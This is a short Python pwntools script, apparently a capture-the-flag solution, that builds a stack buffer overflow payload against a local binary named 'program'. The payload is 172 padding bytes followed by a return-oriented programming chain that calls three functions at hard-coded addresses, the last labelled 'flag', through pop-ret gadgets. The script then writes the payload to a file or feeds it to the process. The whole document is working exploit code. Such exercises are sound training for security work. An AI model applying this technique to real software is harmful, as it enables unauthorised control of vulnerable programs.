#!/usr/bin/env python
import pwn
import sys

poppopret = pwn.pack(0x804939a)  # gadgets try ROPgadget
poppoppopret = pwn.pack(0x8049399)  # gadgets try ROPgadget

f1 = pwn.pack(0x80491b2)
f1arg1 = pwn.pack(0x9c)
f1arg2 = pwn.pack(0x12c)

f2 = pwn.pack(0x80491f6)
f2arg1 = pwn.pack(0x0)
f2arg2 = pwn.pack(0xd)
f2arg3 = pwn.pack(0xd)

flag = pwn.pack(0x0804924c)
f3arg1 = pwn.pack(0x2)

buff = 'A' * 172

payload = buff + \
    f1 + poppopret + \
    f1arg1 + f1arg2 + \
    f2 + poppoppopret + \
    f2arg1 + f2arg2 + f2arg3 + \
    flag + 'JUNK' + \
    f3arg1

if 2 == len(sys.argv) and 'test' == sys.argv[1]:
    open('payload.txt', 'w').write(payload)
    print(payload)
else:
    elf = pwn.ELF('./program')

    p = elf.process()
    p.sendline(payload)
    print(p.clean())
